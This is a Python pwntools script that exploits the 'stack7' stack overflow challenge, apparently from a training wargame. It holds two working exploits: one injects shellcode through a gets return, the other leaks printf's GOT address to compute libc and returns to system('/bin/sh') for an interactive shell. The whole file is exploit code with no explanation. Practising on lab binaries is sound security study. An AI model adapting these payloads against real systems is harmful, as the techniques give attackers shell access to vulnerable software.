from pwn import *
r = process('./stack7')
raw_input("?")

def shellcode():
	shelladd = 0x08049000
	gets = 0x80483a4
	shellcode = asm(shellcraft.sh())
	payload = "A"*80
	payload += p32(gets)
	payload += p32(shelladd)
	payload += p32(shelladd)
	r.sendline(payload)
	r.sendline(shellcode)
	r.interactive()

def binsh():
	printf_plt = 0x080483e4
	ret_main = 0x08048553
	printf_got = 0x0804975c
	offset_system = 0x3ada0
	offset_printf = 0x49670
	offset_binsh = 0x15ba0b
	getpath = 0x080484c4
	pop_ret = 0x08048493
	payload = "A"*80
	payload += p32(printf_plt)
	payload += p32(getpath)
	payload += p32(printf_got)
	r.sendline(payload)
	print r.recvuntil("\n")
	res = r.recv(4)
	printf = u32(res)
	base = printf - offset_printf
	system = base + offset_system
	binsh = base + offset_binsh
	log.info("printf: %#x" %printf)
	log.info("base: %#x" %base)
	log.info("system: %#x" %system)
	log.info("binsh: %#x" %binsh)
	payload = "A"*80
	payload += p32(pop_ret)
	payload += "AAAA"
	payload += p32(system)
	payload += p32(getpath)
	payload += p32(binsh)
	r.sendline(payload)
	r.interactive()
binsh()
